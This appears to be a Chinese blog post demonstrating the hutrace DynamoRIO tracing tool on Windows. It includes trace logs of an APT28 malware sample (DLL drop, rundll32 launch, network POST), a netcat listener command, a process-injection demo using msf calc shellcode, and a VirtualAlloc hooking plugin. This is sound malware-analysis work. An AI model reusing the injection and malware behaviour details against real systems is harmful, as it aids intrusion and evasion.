<p>这不就是rop嘛，如果只关注该exp的功能的话可以往后分析其Shellcode功能，分析漏洞成因的话当然到这里还不算完，日志文件里记录的还有流程信息、内存API申请释放等的结果信息可以辅助分析成因，如果继续跟上一个漏洞一样无脑全指令状态记录的话我曾经测试过虚拟机里大概需要五六个小时，日志文件70多个G。。。虽然已经比调试器trace等快得多了，但是trace的日志太大很影响检索，也没有必要，可以考虑在一定的分析基础上再使用hutrace对trace的日志文件进行裁剪或者对漏洞成因进行一定的探究后再指定起始地址开始进行寄存器状态等的记录，也可以用Windbg的TTD、Windbg开页堆等等快速定位，手段比较多，hutrace毕竟只是一个trace工具，不是一个智能全自动化分析工具，纯粹依赖hutrace的话可能有的场景下还不如windbg的几条命令快一点，根据实际情况能辅助到分析过程即可。</p>
<h2 id="2-病毒样本分析"><a href="#2-病毒样本分析" class="headerlink" title="2. 病毒样本分析"></a>2. 病毒样本分析</h2><p>看雪上随便找了一个apt28组织的样本，直接hutrace上去怼：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;hutrace.exe  -only_from_app  -print_ret_addr -print_ins_info -config C:\Users\admin\Desktop\bin\hutrace-apt28.config -- Win32.SofacyCarberp.bin.exe</span><br></pre></td></tr></table></figure>
<p>在得到的trace日志中可得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~2948~~ KERNEL32.dll!CreateFileW N:0x1b4</span><br><span class="line">    arg 0: C:\Users\admin\AppData\Local\cdnver.dll (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 1: 0x4 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x2 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 4: 0x2 (type=DWORD, size=0x4)</span><br><span class="line">    arg 5: 0x2 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x401630,offset:0x1630</span><br><span class="line">......</span><br><span class="line">//对于一些使用完后自删除的文件可以通过解析trace日志将其保存，也可以使用hutrace的dump功能。</span><br><span class="line">~~2948~~ KERNEL32.dll!WriteFile N:0x1b8</span><br><span class="line">    arg 0: 0x90 (type=HANDLE, size=0x4)</span><br><span class="line">    arg 1: 0x22f098</span><br><span class="line">000000: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  MZ..............</span><br><span class="line">000010: b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000030: 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00  ................</span><br><span class="line">000040: 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68  ........!..L.!Th</span><br><span class="line">000050: 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f  is program canno</span><br><span class="line">000060: 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20  t be run in DOS </span><br><span class="line">000070: 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  mode....$.......</span><br><span class="line">000080: 21 26 0a 2b 65 47 64 78 65 47 64 78 65 47 64 78  !&amp;.+eGdxeGdxeGdx</span><br><span class="line">......</span><br><span class="line">~~2948~~ SHELL32.dll!ShellExecuteW N:0x35b</span><br><span class="line">    arg 0: 0x0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: open (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 2: RunDll32.exe  (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 3: &quot;C:\Users\admin\AppData\Local\cdnver.dll&quot;,#1 (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 4: &lt;null&gt; (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 5: 0x0 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x40183d,offset:0x183d</span><br></pre></td></tr></table></figure>

<p>恢复快照设置自动追踪rundll32.exe,并指定trace释放的cdnver.dll模块的行为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;drconfig.exe -reg rundll32.exe -syswide_on -c hutracelib.dll -only_from_app -print_ret_addr -print_ins_info  -trace_to_librarys cdnver.dll -logdir C:\Users\admin\Desktop\bin\ -config C:\Users\admin\Desktop\bin\hutrace-apt28.config</span><br></pre></td></tr></table></figure>
<p>截取部分日志结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~2620~~ KERNEL32.dll!CreateMutexA N:0x50</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 1: 0x1 (type=BOOL, size=0x4)</span><br><span class="line">    arg 2: vgekW8b1st6yjzPA9fewB70o7KC (type=char*, size=0x0)</span><br><span class="line"> and return to module id:39, retraddr: 0x612d1e,offset:0x2d1e</span><br><span class="line">~~2620~~ KERNELBASE.dll!CreateMutexA N:0x51</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 1: 0x1 (type=BOOL, size=0x4)</span><br><span class="line">    arg 2: vgekW8b1st6yjzPA9fewB70o7KC (type=char*, size=0x0)</span><br><span class="line"> and return to module id:39, retraddr: 0x612d1e,offset:0x2d1e</span><br><span class="line">612d1e:                   &lt;---- 打印有些乱序，不太美观，无伤大雅，懒得改了</span><br><span class="line">     mov    edi, eax</span><br><span class="line">     call   dword ptr [0x006170b8]</span><br><span class="line"> and CreateMutexA return value:  0x120       &lt;----返回值应该比前两条指令汇编信息先打印的...</span><br><span class="line"> and CreateMutexA return value:  0x120 </span><br><span class="line">......</span><br><span class="line">~~2620~~ urlmon.dll!ObtainUserAgentString N:0x89</span><br><span class="line">    arg 0: 0x0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x0072ff20 =&gt; 0xa2 (type=DWORD*, size=0x4)</span><br><span class="line"> and return to module id:39, retraddr: 0x6136fb,offset:0x36fb</span><br><span class="line"> and ObtainUserAgentString return value:  0x0 </span><br><span class="line">    arg 1: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C) (type=char*, size=0x0)</span><br><span class="line">......</span><br><span class="line">~~2620~~ ADVAPI32.dll!RegOpenKeyExA N:0x96</span><br><span class="line">    arg 0: 0x80000002 (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line">    arg 1: Software\Microsoft\Windows\CurrentVersion\Internet Settings\Servers (type=char*, size=0x0)</span><br><span class="line">    arg 2: 0x0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x00000001 (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line"> and return to module id:39, retraddr: 0x615279,offset:0x5279</span><br><span class="line">......</span><br><span class="line">~~2620~~ WININET.dll!InternetOpenA N:0xbc</span><br><span class="line">    arg 0: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C) (type=char*, size=0x0)</span><br><span class="line">    arg 1: 0x0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 3: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 4: 0x0 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:39, retraddr: 0x61485c,offset:0x485c</span><br><span class="line"> and InternetOpenA return value:  0xcc0004 </span><br><span class="line">......</span><br><span class="line">~~2620~~ WININET.dll!InternetConnectA N:0xbd</span><br><span class="line">    arg 0: 0xcc0004 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: google.com (type=char*, size=0x0)</span><br><span class="line">    arg 2: 0x1bb (type=WORD, size=0x2)</span><br><span class="line">    arg 3: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 4: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 5: 0x3 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:39, retraddr: 0x614873,offset:0x4873</span><br><span class="line"> and InternetConnectA return value:  0xcc0008 </span><br><span class="line"> ......</span><br><span class="line"> ~~2620~~ WININET.dll!HttpOpenRequestA N:0xe65</span><br><span class="line">    arg 0: 0xcc0008 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: POST (type=char*, size=0x0)</span><br><span class="line">    arg 2: /ffff/ffff/ffff/ffff/UUUUUU.vnd.radisys.msml-basic-layout/?U=R3H9gETPMuF94yrwJfA= (type=char*, size=0x0)</span><br><span class="line">    arg 3: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 4: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 5: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line"> and return to module id:39, retraddr: 0x6148a3,offset:0x48a3</span><br><span class="line"> and HttpOpenRequestA return value:  0xcc000c </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>该样本实际是先使用谷歌域名测试下网络联通性，后面还会根据解析出的真正C2服务器域名信息，进行交替访问，不过我虚拟机里没联网，没有记录其与真正C2服务器域名的通信行为。</p>
<p>常规的API Monitor工具只是记录API函数的调用行为，而hutrace则更加灵活，虽然上述例子中其实也是仅对样本的API调用情况进行了查看，实际中是可以对trace日志中更细粒度的基本块、指令、寄存器及内存情况进行分析，例如根据日志中打印的汇编指令情况可以很快澄清API函数中参数来源等，对于病毒样本类的分析使用hutrace对性能影响一般比较小，上述例子生成的trace日志加一起也只有几十兆，也完全可以使用打印寄存器和内存功能，整个分析过程可以看到完全可以不需调试器的参与，在trace日志中进行特定代码的检索也比较便捷，也可以自己做解析二次处理，在下面的插件例子中会介绍一些更个性化的应用~</p>
<h2 id="3-Windows-Syscall记录"><a href="#3-Windows-Syscall记录" class="headerlink" title="3. Windows Syscall记录"></a>3. Windows Syscall记录</h2><p>一些木马样本、Shellcode如cs等提供syscall方式躲避杀软以及一部分AV/EDR的功能，给分析也带来了一定的难度，hutrace中添加了syscall记录的功能，可以使用-print_syscall选项开启，但是Windows上系统版本差异较大，测试中dynamorio的内置获取系统版本的函数可能会很奇怪的获取失败，如果获取失败的话hutrace会从hutrace.config文件中读取自定义设置的系统版本号进行对应版本syscall table的选择，syscall table列表提取自drstrace项目（支持到win10 1803），如果内置获取系统版本的函数调用失败且hutrace.config中未设置自定义的系统版本，会使用hutrace程序中默认设置的win7系统的系统调用表对目标程序运行时的syscall进行标记。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//hutrace.config中设置添加下述内容设置系统版本</span><br><span class="line">winver|61</span><br><span class="line"></span><br><span class="line">//可设置的系统版本号范围来自dr_tools.h文件中的定义</span><br><span class="line">//DR_WINDOWS_VERSION_10_1803 = 105,</span><br><span class="line">//DR_WINDOWS_VERSION_10_1709 = 104,</span><br><span class="line">//DR_WINDOWS_VERSION_10_1703 = 103,</span><br><span class="line">//DR_WINDOWS_VERSION_10_1607 = 102,</span><br><span class="line">//DR_WINDOWS_VERSION_10_1511 = 101,</span><br><span class="line">//DR_WINDOWS_VERSION_10 = 100,</span><br><span class="line">//DR_WINDOWS_VERSION_8_1 = 63,</span><br><span class="line">//DR_WINDOWS_VERSION_2012_R2 = DR_WINDOWS_VERSION_8_1,</span><br><span class="line">//DR_WINDOWS_VERSION_8 = 62,</span><br><span class="line">//DR_WINDOWS_VERSION_2012 = DR_WINDOWS_VERSION_8,</span><br><span class="line">//DR_WINDOWS_VERSION_7 = 61,</span><br><span class="line">//DR_WINDOWS_VERSION_2008_R2 = DR_WINDOWS_VERSION_7,</span><br><span class="line">//DR_WINDOWS_VERSION_VISTA = 60,</span><br><span class="line">//DR_WINDOWS_VERSION_2008 = DR_WINDOWS_VERSION_VISTA,</span><br><span class="line">//DR_WINDOWS_VERSION_2003 = 52,</span><br><span class="line">//DR_WINDOWS_VERSION_XP_X64 = DR_WINDOWS_VERSION_2003,</span><br><span class="line">//DR_WINDOWS_VERSION_XP = 51,</span><br><span class="line">//DR_WINDOWS_VERSION_2000 = 50,</span><br><span class="line">//DR_WINDOWS_VERSION_NT = 40,</span><br></pre></td></tr></table></figure>
<p>hutrace.config中不设置系统调用对应的参数类型的话，默认只打印syscall的名称，如果遇到感兴趣的syscall需要记录，可以在hutrace.config进行设置如下（以NtCreateKey为例）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//第五个参数为UNICODE_STRING结构体的定义，其中自己多加的结构体中的int型为字节对齐的填充，参见第一篇结构体打印中的介绍。在使用结构体类型时必须指定^NUM或者^ARG确定结构体的大小和数目</span><br><span class="line">int|syscall_NtCreateKey|VOID|VOID|VOID|VOID|struct_ptr&#123;WORD.WORD.int.wchar*&#125;^NUM1|VOID|VOID</span><br><span class="line"></span><br><span class="line">//开始记录</span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe  -only_from_app  -print_ret_addr  -print_ins_info  -print_syscall -- nc64.exe -lvp 8080</span><br></pre></td></tr></table></figure>
<p>得到的日志中的syscall记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~880~~ S|syscall_NtAllocateVirtualMemory_21 N:0x268             //不设置对应参数类型默认只打印syscall的名称</span><br><span class="line"> and syscall_NtAllocateVirtualMemory return</span><br><span class="line">~~880~~ S|syscall_NtCreateEvent_69 N:0x269</span><br><span class="line"> and syscall_NtCreateEvent return</span><br><span class="line">~~880~~ S|syscall_NtQueryKey_19 N:0x26a</span><br><span class="line"> and syscall_NtQueryKey return</span><br><span class="line">~~880~~ S|syscall_NtCreateKey_26 N:0x26b</span><br><span class="line">    arg 0: 0x000000000022ef68 (type=void, size=0x0)</span><br><span class="line">    arg 1: 0x0000000000020019 (type=void, size=0x0)</span><br><span class="line">    arg 2: 0x000000000022ef88 (type=void, size=0x0)</span><br><span class="line">    arg 3: 0x0000000000000000 (type=void, size=0x0)</span><br><span class="line">    arg 4: 0x000000000022f330</span><br><span class="line"> and Struct Begin:</span><br><span class="line">    arg 0: 0xa (type=WORD, size=0x2)</span><br><span class="line">    arg 1: 0xc (type=WORD, size=0x2)</span><br><span class="line">    arg 2: 0x0 (type=int, size=0x4)</span><br><span class="line">    arg 3: Class (type=wchar_t*, size=0x0)</span><br><span class="line">and Struct End</span><br><span class="line"> (type=struct_ptr&#123;WORD.WORD.int.wchar*&#125;^NUM1*, size=0x1)</span><br><span class="line">    arg 5: 0x0000000000000000 (type=void, size=0x0)</span><br><span class="line"> and syscall_NtCreateKey return</span><br></pre></td></tr></table></figure>
<p>在Windows上界面程序一般没必要开启syscall记录，非界面程序的记录需求也比较少，默认是记录程序中所有的syscall调用，不会过滤是否为目标程序本身或者系统函数中的调用，导致trace的日志量也会比较大。</p>
<h2 id="4-任意地址HOOK：Windows平台hutrace插件编写"><a href="#4-任意地址HOOK：Windows平台hutrace插件编写" class="headerlink" title="4. 任意地址HOOK：Windows平台hutrace插件编写"></a>4. 任意地址HOOK：Windows平台hutrace插件编写</h2><p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/7.png" alt=""></p>
<p>调试时经常遇到需要对特定指令或数据进行运行时修改的情况，hutrace本身提供了一个简易patch的功能，但是对于一些复杂场景显得处理能力较弱，为了实现功能更强大的自定义代码注入功能，hutrace添加了插件功能，可基本实现在程序的任意运行状态修改程序运行信息，下面以一个固定VirtualAlloc内存申请基址的小需求为例，利用提供的hutrace的插件模板很容易即可实现。首先看一个演示的注入程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;hutrace.exe  -only_from_app  -print_ret_addr -print_ins_info -- inject.exe</span><br></pre></td></tr></table></figure>
<p>主体功能为注入rundll32.exe弹出计算器的Shellcode（VirtualAllocEx在rundll32.exe内存空间申请0x800大小内存），为了演示，自身也加了一段申请0x1234大小的内存的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I4012a2|77e305f4                            &lt;-------VirtualAlloc函数地址</span><br><span class="line">~~2808~~ KERNEL32.dll!VirtualAlloc N:0x1bd</span><br><span class="line">    arg 0: 0x00000000 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 1: 0x1234 (type=size_t, size=0x4)</span><br><span class="line">    arg 2: 0x1000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x4 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x4012a8,offset:0x12a8</span><br><span class="line">~~2808~~ KERNELBASE.dll!VirtualAlloc N:0x1be</span><br><span class="line">    arg 0: 0x00000000 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 1: 0x1234 (type=size_t, size=0x4)</span><br><span class="line">    arg 2: 0x1000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x4 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x4012a8,offset:0x12a8</span><br><span class="line"> ...</span><br><span class="line"> and VirtualAlloc return value:  0x160000 </span><br><span class="line"> ...</span><br><span class="line"> ~~2808~~ KERNEL32.dll!CreateProcessA N:0x1bf</span><br><span class="line">    arg 0: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 1: c:\windows\system32\rundll32.exe (type=char*, size=0x0)</span><br><span class="line">    arg 2: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 3: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 4: 0x0 (type=BOOL, size=0x4)</span><br><span class="line">    arg 5: 0x4 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x4012e7,offset:0x12e7</span><br><span class="line">4012e7:</span><br><span class="line">     push   0x00414558</span><br><span class="line">     call   0x00402149</span><br><span class="line"> and CreateProcessA return value:  0x1 </span><br><span class="line">    arg 1: c:\windows\system32\rundll32.exe (type=char*, size=0x0)</span><br><span class="line"> ...</span><br><span class="line"> I401325|77e1b42c                            &lt;-------VirtualAllocEx函数地址</span><br><span class="line">~~2808~~ KERNEL32.dll!VirtualAllocEx N:0x1da</span><br><span class="line">    arg 0: 0x58 (type=HANDLE, size=0x4)</span><br><span class="line">    arg 1: 0x00000000 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 2: 0x800 (type=size_t, size=0x4)</span><br><span class="line">    arg 3: 0x3000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 4: 0x40 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x40132b,offset:0x132b</span><br><span class="line"> ...</span><br><span class="line"> and VirtualAllocEx return value:  0xb0000</span><br></pre></td></tr></table></figure>
<p>下面我们来使用插件把程序本身申请0x1234大小的内存地址固定为0x18000000，进程注入的Shellcode内存地址固定为0x19000000，首先在hutrace.config配置文件中添加以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hook|null|0x77e305f4|myDynamorioPlugin.dll|f_hookpre|f_hookpost</span><br><span class="line">hook|null|0x77e1b42c|myDynamorioPlugin.dll|f_hookprex|f_hookpostx</span><br></pre></td></tr></table></figure>
<p>其中null代表不使用模块名方式寻址，也即是指示后续的0x77e305f4、0x77e1b42c为绝对地址，分别为KERNEL32.dll模块VirtualAlloc、VirtualAllocEx函数地址，在上面的记录日志里也有体现，在我虚拟机中设置了关闭ASLR,当然只要不重启系统有的dll地址也不会变化，以第一条内容为例，意思是在程序执行到0x77e305f4地址时加载自定义的插件myDynamorioPlugin.dll，并且分别在该地址对应的函数执行前后分别执行插件中的f_hookpre、f_hookpost导出函数（注意并非该地址指令执行前后，如果该地址对应的并非一个函数，可以设置f_hookpost为null，否则可能会导致程序崩溃）。</p>
<p>VirtualAllocEx函数对应的f_hookprex、f_hookpostx函数实现类似。功能为固定返回0x19000000的内存地址，不再赘述，注意参数顺序即可，可见附件中工程代码，下面看下hutrace插件模板中对应的f_hookpre、f_hookpost函数实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg_t my_0x1234_flag = 0;</span><br><span class="line">reg_t my_newmem_0x1234 = 0;</span><br><span class="line">reg_t my_newsize_0x1234 = 0;</span><br><span class="line"></span><br><span class="line">MYDYNAMORIOPLUGIN_API reg_t f_hookpre(file_t outf, dr_mcontext_t *mc, reg_t ret_addr)</span><br><span class="line">&#123;</span><br><span class="line">     reg_t m_arg1 = my_getarg(mc, 1);</span><br><span class="line">     reg_t m_arg2 = my_getarg(mc, 2);</span><br><span class="line">     reg_t m_arg3 = my_getarg(mc, 3);</span><br><span class="line"></span><br><span class="line">     my_fprintf(outf, &quot;[hook]:arg_1: &quot;PIFMT&quot; \n&quot;, m_arg1);</span><br><span class="line">     my_fprintf(outf, &quot;[hook]:arg_2:  &quot;PIFMT&quot;\n&quot;, m_arg2);</span><br><span class="line">     my_fprintf(outf, &quot;[hook]:arg_3:  &quot;PIFMT&quot;\n&quot;, m_arg3);</span><br><span class="line">     my_fprintf(outf, &quot;[hook]:arg_4:  &quot;PIFMT&quot;\n&quot;, my_getarg(mc, 4));</span><br><span class="line">     my_fprintf(outf, &quot;[hook]:ret_addr: &quot;PIFMT&quot; \n&quot;, ret_addr);</span><br><span class="line"></span><br><span class="line">     if (m_arg2 == 0x1234)</span><br><span class="line">     &#123;</span><br><span class="line">          my_newmem_0x1234 = (SIZE_T)VirtualAlloc((LPVOID)0x18000000, m_arg2, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">          my_newsize_0x1234 = m_arg2;</span><br><span class="line">          my_0x1234_flag = TRUE;</span><br><span class="line">     &#125;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MYDYNAMORIOPLUGIN_API reg_t f_hookpost(file_t outf, dr_mcontext_t *mc, reg_t ret_val)</span><br><span class="line">&#123;</span><br><span class="line">     //ret_val = 0xffffffff;</span><br><span class="line">     if (my_0x1234_flag)</span><br><span class="line">     &#123;</span><br><span class="line">          my_fprintf(outf, &quot;[hook]:my_newmem_0x1234: &quot;PIFMT&quot; \n&quot;, my_newmem_0x1234);</span><br><span class="line">          VirtualFree((LPVOID)ret_val, my_newsize_0x1234, MEM_DECOMMIT);</span><br><span class="line">          my_0x1234_flag = false;</span><br><span class="line">          return my_newmem_0x1234;</span><br><span class="line">     &#125;</span><br><span class="line">     my_fprintf(outf, &quot;[hook]:ret_val: &quot;PIFMT&quot; \n&quot;, ret_val);</span><br><span class="line">     return ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写的比较简陋，也没有严格处理内存申请失败等等情况，仅作演示用，my_fprintf（写入到trace日志中）、my_getarg（按照API调用约定获取参数的值）为模板中已经实现好的函数，在f_hookpre、f_hookpost函数中可以对任意寄存器（利用传进来的mc参数）、内存进行修改，也可以调用其它API函数。</p>
<p>下面把生成的插件放置到hutrace同目录下，再次trace目标进程inject.exe:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;hutrace.exe  -only_from_app  -print_ret_addr -print_ins_info  -- inject.exe</span><br></pre></td></tr></table></figure>

<p>查看日志中的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I4012c4|77e305f4</span><br><span class="line">hook_plugin:myDynamorioPlugin.dll!0x350000    hook_func:f_hookpre!0x351030   &lt;---hutrace输出的调试信息</span><br><span class="line">hook_entry  null!0x77e305f4 to myDynamorioPlugin.dll!f_hookpre   &lt;---hutrace输出的调试信息</span><br><span class="line">[hook]:arg_1: 0    &lt;-----插件中my_fprintf函数的输出信息</span><br><span class="line">[hook]:arg_2:  1234</span><br><span class="line">[hook]:arg_3:  1000</span><br><span class="line">[hook]:arg_4:  4</span><br><span class="line">[hook]:ret_addr: 4012ca </span><br><span class="line">~~892~~ KERNELBASE.dll!VirtualAlloc N:0x1bd</span><br><span class="line">    arg 0: 0x00000000 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 1: 0x1234 (type=size_t, size=0x4)</span><br><span class="line">    arg 2: 0x1000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x4 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x4012ca,offset:0x12ca</span><br><span class="line"> and VirtualAlloc return value:  0x160000 </span><br><span class="line">hook_plugin:myDynamorioPlugin.dll!0x350000    hook_func:f_hookpost!0x3510e0 &lt;---hutrace输出的调试信息</span><br><span class="line">hook_end  null!0x77e305f4 to myDynamorioPlugin.dll!f_hookpost &lt;---hutrace输出的调试信息</span><br><span class="line">[hook]:my_newmem_0x1234: 18000000 </span><br><span class="line">...</span><br><span class="line">I40131f|77e1b42c</span><br><span class="line">hook_plugin:myDynamorioPlugin.dll!0x350000    hook_func:f_hookprex!0x351150</span><br><span class="line">hook_entry  null!0x77e1b42c to myDynamorioPlugin.dll!f_hookprex</span><br><span class="line">[hook]:arg_1: 5c </span><br><span class="line">[hook]:arg_2:  0</span><br><span class="line">[hook]:arg_3:  800</span><br><span class="line">[hook]:arg_4:  3000</span><br><span class="line">[hook]:arg_5:  40</span><br><span class="line">[hook]:ret_addr: 401325 </span><br><span class="line">~~892~~ KERNELBASE.dll!VirtualAllocEx N:0x1c0</span><br><span class="line">    arg 0: 0x5c (type=HANDLE, size=0x4)</span><br><span class="line">    arg 1: 0x00000000 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 2: 0x800 (type=size_t, size=0x4)</span><br><span class="line">    arg 3: 0x3000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 4: 0x40 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x401325,offset:0x1325</span><br><span class="line"> and VirtualAllocEx return value:  0xc0000 </span><br><span class="line">hook_plugin:myDynamorioPlugin.dll!0x350000    hook_func:f_hookpostx!0x351220</span><br><span class="line">hook_end  null!0x77e1b42c to myDynamorioPlugin.dll!f_hookpostx</span><br><span class="line">[hook]:my_newmem_0x800: 19000000</span><br></pre></td></tr></table></figure>
<p>可以同时trace下rundll32查看其注入的shellcode（msf生成的shellcode）确认其代码地址确实已经被替换成自己指定的值0x19000000，需要使用drconfig方式哦，hutrace的follow_children参数有时无法自动trace这类注入进程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">19000000:</span><br><span class="line">     mov    edi, esp</span><br><span class="line">     fcmovnb st0, st1</span><br><span class="line">     fnstenv [edi-0x0c]</span><br><span class="line">19000007:</span><br><span class="line">     pop    ebp</span><br><span class="line">     push   ebp</span><br><span class="line">     pop    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">     dec    ecx</span><br><span class="line">//省略部分代码</span><br></pre></td></tr></table></figure>
<p>这个需求的实现能够同时支撑hutrace的其它功能（record_start_addr的指定地址开始记录功能等），不过使用时需要注意会同时导致小问题，Hook的地址与API信息打印、简易Patch功能等功能冲突，如上例对VirtualAlloc函数HOOK之后即不会再打印其KERNEL32.dll模块里VirtualAlloc参数信息，当然KERNELBASE.dll的还是会打印。</p>
<p>另外hutrace.config文件中中使用hook功能时同时支持以下语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hook|null|0x7612efa2|myDynamorioPlugin.dll|f_hookpre|f_hookpost</span><br><span class="line">hook|null|0x7612f273|myDynamorioPlugin.dll|f_hookpre1|null</span><br><span class="line"></span><br><span class="line">hook|test.exe|0x101c|myDynamorioPlugin.dll|f_hookpre|null</span><br><span class="line">hook|test.exe|0x102A|myDynamorioPlugin.dll|f_hookpre|f_hookpost</span><br><span class="line"></span><br><span class="line">hook|user32.dll|MessageBoxA|myDynamorioPlugin.dll|f_hookpre|f_hookpost</span><br><span class="line">hook|user32.dll|MessageBoxA+4|myDynamorioPlugin.dll|f_hookpre|f_hookpost</span><br></pre></td></tr></table></figure>
<ul>
<li>注意使用hook功能时kernel32.dll、kernelbase.dll的地址不能写成上述user32.dll|MessageBoxA、test.exe|0x101c的形式，直接写成绝对地址，因为该插件实际上是作为dynamroio插件运行，常规获取user32.dll的方式获取的kernel32.dll地址实际上并非目标进程中对应的地址，可以使用processexplorer查看目标进程实际上是加载了两个kernel32.dll的，而且在这种情况下实际获取的VirtualAlloc函数地址也有其它问题，不再展开描述了，但是也正是如此，hook功能中执行调用API函数才不会对trace目标进程造成影响，只是需要注意避免出现上述获取kernel32.dll地址问题。</li>
</ul>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><ol>
<li><p>dynamorio 8.0及以上版本编译的hutrace程序可以在Win10上运行，然而我自己测试的Win10本机运行hutrace记录的效率还不如自己的2核2g内存的“胜七”虚拟机，不知道是什么鬼原因。。。</p>
</li>
<li><p>hutrace源码近期暂先不发布呀，其实目前功能已经比较完善了，应该用不到改源码加啥功能，没啥技术含量，水平比较弱，写的比较随意，抽空把辣眼睛的地方改改少挨点骂。</p>
</li>
